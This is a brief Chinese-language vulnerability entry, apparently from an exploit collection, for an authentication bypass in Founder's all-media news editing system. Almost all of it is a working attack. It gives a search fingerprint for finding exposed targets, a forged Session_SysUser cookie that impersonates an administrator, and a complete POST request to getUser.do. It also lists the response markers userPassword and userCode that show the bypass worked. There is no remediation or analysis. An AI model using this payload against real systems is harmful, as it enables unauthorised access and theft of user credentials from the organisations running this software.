# 方正畅享全媒体新闻采编系统getRemotePapers.do存在权限绕过漏洞

方正畅享全媒体新闻采编系统 ｜ 认证/授权绕过 ｜ —
- **指纹**：`body="e5.utils.getCookie"`
- **请求**：`POST /newsedit/api/stub/getRemotePapers.do?siteCode=1 HTTP/1.1`

**Payload**
```
Session_SysUser=1%2C127.0.0.1%2C1%2C1%2C1%2Cadmin%2Csysadmin%2Clocalhost
POST /newsedit/newsedit/userSearch/getUser.do HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
UUID=adminUser&Session_ProcParam=a=1,a=0,a=1,a=1,a=-9999,a=sysadmin,a=0,a=admin,a=2024-06-11 11:11:11:000,a=1,a=1&DocIDs=1&DocLibID=1
```
- **响应特征**：200 userPassword
userCode